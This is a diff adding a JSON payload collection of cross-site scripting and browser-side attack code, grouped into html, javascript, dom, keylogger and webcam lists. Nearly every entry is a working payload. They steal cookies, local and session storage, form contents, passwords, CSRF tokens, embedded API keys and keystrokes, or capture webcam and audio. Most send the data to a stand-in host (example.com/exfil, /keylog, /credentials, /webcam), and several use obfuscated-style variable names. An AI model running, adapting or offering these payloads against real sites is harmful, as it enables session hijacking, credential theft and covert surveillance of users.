@@ -1,0 +1,54 @@
+{
+  "html": [
+    "<script>var _0x1a2b=function(){return document.cookie}();alert(_0x1a2b)</script>",
+    "<img src=x onerror=\"var _0x1a2b=function(){return document.cookie}();alert(_0x1a2b)\">",
+    "<svg onload=\"var _0x1a2b=function(){return document.cookie}();alert(_0x1a2b)\">",
+    "<iframe srcdoc=\"<script>var _0x1a2b=function(){return parent.document.cookie}();parent.alert(_0x1a2b)</script>\">",
+    "<script>fetch('https://example.com/exfil?data='+btoa(document.cookie))</script>",
+    "<script>navigator.sendBeacon('https://example.com/exfil', document.cookie)</script>",
+    "<script>var i=new Image();i.src='https://example.com/exfil?data='+btoa(document.cookie)</script>",
+    "<script>var xhr=new XMLHttpRequest();xhr.open('POST','https://example.com/exfil',true);xhr.send(document.cookie)</script>",
+    "<script>window.location='https://example.com/exfil?data='+btoa(document.cookie)</script>",
+    "<script>document.write('<img src=\"https://example.com/exfil?data='+btoa(document.cookie)+'\">')</script>"
+  ],
+  "javascript": [
+    "(function(){return document.cookie})();",
+    "Object.keys(localStorage).forEach(function(k){fetch('https://example.com/exfil?key='+k+'&value='+btoa(localStorage[k]))});",
+    "Object.keys(sessionStorage).forEach(function(k){fetch('https://example.com/exfil?key='+k+'&value='+btoa(sessionStorage[k]))});",
+    "var _0x1a2b=document.cookie.split(';').map(function(c){return c.trim().split('=')}).reduce(function(a,b){a[b[0]]=b[1];return a},{});alert(JSON.stringify(_0x1a2b));",
+    "var _0x1a2b=document.forms[0];var data={};for(var i=0;i<_0x1a2b.elements.length;i++){data[_0x1a2b.elements[i].name]=_0x1a2b.elements[i].value;}fetch('https://example.com/exfil',{method:'POST',body:JSON.stringify(data)});",
+    "var _0x1a2b=document.querySelectorAll('input[type=password]');var data=[];for(var i=0;i<_0x1a2b.length;i++){data.push({id:_0x1a2b[i].id,name:_0x1a2b[i].name,value:_0x1a2b[i].value});}fetch('https://example.com/exfil',{method:'POST',body:JSON.stringify(data)});",
+    "var _0x1a2b=function(){var data={url:location.href,cookies:document.cookie,localStorage:localStorage,sessionStorage:sessionStorage};return data;}();fetch('https://example.com/exfil',{method:'POST',body:JSON.stringify(_0x1a2b)});",
+    "var _0x1a2b=function(){var data={};data.url=location.href;data.cookies=document.cookie;data.referrer=document.referrer;data.userAgent=navigator.userAgent;return data;}();fetch('https://example.com/exfil',{method:'POST',body:JSON.stringify(_0x1a2b)});",
+    "var _0x1a2b=function(){var data={};data.url=location.href;data.cookies=document.cookie;data.html=document.documentElement.outerHTML;return data;}();fetch('https://example.com/exfil',{method:'POST',body:JSON.stringify(_0x1a2b)});",
+    "var _0x1a2b=function(){var data={};data.url=location.href;data.cookies=document.cookie;data.screenshot=function(){var canvas=document.createElement('canvas');canvas.width=window.innerWidth;canvas.height=window.innerHeight;canvas.getContext('2d').drawWindow(window,0,0,window.innerWidth,window.innerHeight,'rgb(255,255,255)');return canvas.toDataURL();}();return data;}();fetch('https://example.com/exfil',{method:'POST',body:JSON.stringify(_0x1a2b)});"
+  ],
+  "dom": [
+    "document.querySelector('#sensitive-data').innerText",
+    "document.querySelectorAll('input[type=password]').forEach(function(e){fetch('https://example.com/exfil?data='+btoa(e.value))});",
+    "document.querySelectorAll('form').forEach(function(f){f.addEventListener('submit',function(e){e.preventDefault();var data={};for(var i=0;i<f.elements.length;i++){data[f.elements[i].name]=f.elements[i].value;}fetch('https://example.com/exfil',{method:'POST',body:JSON.stringify(data)});})});",
+    "document.querySelectorAll('a[href*=\"token=\"]').forEach(function(a){fetch('https://example.com/exfil?token='+a.href.split('token=')[1])});",
+    "document.querySelectorAll('script').forEach(function(s){if(s.textContent.includes('apiKey')){fetch('https://example.com/exfil?data='+btoa(s.textContent));}});",
+    "document.querySelectorAll('meta').forEach(function(m){if(m.getAttribute('name')=='csrf-token'){fetch('https://example.com/exfil?token='+m.getAttribute('content'));}});",
+    "document.querySelectorAll('*[data-secret]').forEach(function(e){fetch('https://example.com/exfil?data='+btoa(e.getAttribute('data-secret')))});",
+    "document.querySelectorAll('*').forEach(function(e){for(var i=0;i<e.attributes.length;i++){if(e.attributes[i].name.startsWith('data-') && e.attributes[i].value.length>10){fetch('https://example.com/exfil?attr='+e.attributes[i].name+'&value='+btoa(e.attributes[i].value));}}});",
+    "document.querySelectorAll('script:not([src])').forEach(function(s){fetch('https://example.com/exfil?data='+btoa(s.textContent))});",
+    "document.querySelectorAll('*').forEach(function(e){if(window.getComputedStyle(e).getPropertyValue('display')=='none' && e.textContent.length>10){fetch('https://example.com/exfil?data='+btoa(e.textContent));}});"
+  ],
+  "keylogger": [
+    "document.addEventListener('keypress',function(e){fetch('https://example.com/keylog?key='+e.key+'&target='+e.target.nodeName+'&id='+e.target.id)});",
+    "document.addEventListener('keypress',function(e){if(e.target.type=='password'){var k=localStorage.getItem('keylog')||'';localStorage.setItem('keylog',k+e.key);if(e.key=='Enter'){fetch('https://example.com/keylog?data='+btoa(localStorage.getItem('keylog')));localStorage.removeItem('keylog');}}});",
+    "document.addEventListener('keypress',function(e){var xhr=new XMLHttpRequest();xhr.open('POST','https://example.com/keylog',true);xhr.send(JSON.stringify({key:e.key,target:e.target.nodeName,id:e.target.id,time:new Date().getTime()}))});",
+    "document.addEventListener('keypress',function(e){var i=new Image();i.src='https://example.com/keylog?key='+e.key+'&target='+e.target.nodeName+'&id='+e.target.id+'&time='+new Date().getTime()});",
+    "document.addEventListener('keypress',function(e){navigator.sendBeacon('https://example.com/keylog',JSON.stringify({key:e.key,target:e.target.nodeName,id:e.target.id,time:new Date().getTime()}))});",
+    "document.addEventListener('keypress',function(e){var data=JSON.parse(localStorage.getItem('keylog')||'[]');data.push({key:e.key,target:e.target.nodeName,id:e.target.id,time:new Date().getTime()});localStorage.setItem('keylog',JSON.stringify(data));if(data.length>=10){fetch('https://example.com/keylog',{method:'POST',body:localStorage.getItem('keylog')});localStorage.removeItem('keylog');}});",
+    "document.addEventListener('keypress',function(e){if(e.target.type=='password'||e.target.name=='username'||e.target.name=='email'){var data=JSON.parse(sessionStorage.getItem('credentials')||'{}');data[e.target.name]=data[e.target.name]||'';data[e.target.name]+=e.key;sessionStorage.setItem('credentials',JSON.stringify(data));}});document.addEventListener('submit',function(e){if(sessionStorage.getItem('credentials')){fetch('https://example.com/credentials',{method:'POST',body:sessionStorage.getItem('credentials')});sessionStorage.removeItem('credentials');}});",
+    "document.addEventListener('keypress',function(e){var buffer=window.buffer||[];buffer.push({key:e.key,time:new Date().getTime()});window.buffer=buffer;if(buffer.length>=20){fetch('https://example.com/keylog',{method:'POST',body:JSON.stringify(buffer)});window.buffer=[];}});",
+    "document.addEventListener('keypress',function(e){var w=window.open('about:blank','keylog','width=1,height=1,left=-100,top=-100');w.document.write('<img src=\"https://example.com/keylog?key='+e.key+'&target='+e.target.nodeName+'&id='+e.target.id+'\">');setTimeout(function(){w.close();},10);});",
+    "document.addEventListener('keypress',function(e){var script=document.createElement('script');script.src='https://example.com/keylog?key='+e.key+'&target='+e.target.nodeName+'&id='+e.target.id;document.body.appendChild(script);setTimeout(function(){document.body.removeChild(script);},10);});"
+  ],
+  "webcam": [
+    "navigator.mediaDevices.getUserMedia({video:true}).then(function(stream){var video=document.createElement('video');video.srcObject=stream;video.play();video.onloadedmetadata=function(){var canvas=document.createElement('canvas');canvas.width=video.videoWidth;canvas.height=video.videoHeight;canvas.getContext('2d').drawImage(video,0,0);fetch('https://example.com/webcam',{method:'POST',body:canvas.toDataURL()});stream.getTracks().forEach(function(track){track.stop();});}});",
+    "navigator.mediaDevices.getUserMedia({video:true,audio:true}).then(function(stream){var mediaRecorder=new MediaRecorder(stream);var chunks=[];mediaRecorder.ondataavailable=function(e){chunks.push(e.data);};mediaRecorder.onstop=function(){var blob=new Blob(chunks,{type:'video/webm'});var formData=new FormData();formData.append('video',blob);fetch('https://example.com/webcam',{method:'POST',body:formData});stream.getTracks().forEach(function(track){track.stop();});};mediaRecorder.start();setTimeout(function(){mediaRecorder.stop();},5000);});"
+  ]
+}
